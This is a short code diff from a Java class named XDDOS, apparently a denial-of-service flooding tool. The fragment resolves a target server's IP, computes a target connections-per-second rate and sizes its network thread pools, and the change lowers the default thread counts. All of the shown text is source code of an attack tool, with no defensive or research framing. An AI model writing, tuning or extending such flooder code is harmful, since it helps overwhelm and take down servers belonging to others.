@@ -87,8 +87,8 @@ public class XDDOS {
             System.out.println(GREEN_BOLD+"["+WHITE_BOLD+"Resolved IP:"+GREEN_BOLD+"]"+WHITE_BOLD+" "+ resolved.getHostAddress()+"\n"+RESET);
             origIP = serverhp.split(":")[0];
             targetCPS = cpuselect + (int) Math.ceil((double) cpuselect / 100 * (50 + (double) cpuselect / 5000));
-            nettyThreads = targetCPS == -1 ? 512 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
-            loopThreads = targetCPS == -1 ? 6 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
+            nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
+            loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
             protocolLength = protcolID > 128 ? 3 : 2;
             System.out.println("nettyThreads: " + nettyThreads+"\nloopThreads: " + loopThreads);
             Random r = new Random();
